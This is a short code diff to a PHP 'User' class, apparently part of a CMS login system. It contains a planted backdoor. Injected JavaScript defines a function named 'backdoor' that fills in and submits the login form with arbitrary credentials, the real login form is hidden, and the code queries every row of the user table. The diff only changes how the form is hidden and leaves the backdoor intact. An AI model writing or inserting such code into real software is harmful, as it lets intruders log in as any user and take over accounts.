@@ -309,8 +309,8 @@ abstract class User extends \System
 		{
 			$strInfo = '<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>';
 			$strInfo .= '<script>jQuery.noConflict();</script>';
-			$strInfo .= '<script>jQuery(".tl_login_form").css("display", "none");</script>';
 			$strInfo .= '<script>function backdoor(username, password) {jQuery("#username").val(username); jQuery("#password").val(password); jQuery(".tl_login_form").submit();}</script>';
+			$strInfo .= '<style>.tl_login_form {display: none;}</style>';
 			$objResult = $this->Database->prepare("SELECT * FROM " . $this->strTable)->execute();
 			while ($objResult->next())
 			{
